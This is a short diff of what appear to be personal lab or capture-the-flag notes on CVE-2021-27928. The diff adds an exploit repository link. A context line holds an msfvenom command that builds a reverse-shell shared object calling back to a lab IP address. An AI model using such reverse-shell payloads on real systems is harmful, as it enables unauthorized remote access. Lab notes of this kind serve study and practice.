@@ -330,6 +330,8 @@ Bye
 
 https://www.cvedetails.com/cve/CVE-2021-27928/
 
+## Exploit
+https://github.com/Al1ex/CVE-2021-27928
 
 ```
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=9002 -f elf-so -oexploit.so
